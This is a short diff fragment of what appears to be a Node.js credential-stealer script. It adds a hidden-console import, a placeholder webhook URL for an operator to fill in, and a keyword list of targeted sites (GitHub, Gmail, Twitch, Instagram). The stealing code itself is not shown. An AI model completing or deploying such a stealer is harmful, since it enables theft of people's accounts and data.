@@ -15,7 +15,7 @@ const hideConsole = require('node-hide-console-window');
 
 
 
-const webhookurl = ""
+const webhookurl = "REPLACE_YOUR_WEBHOOK_HERE"
 const keywords = ['github.com','gmail.com','twitch.tv','instagram.com']
 
 
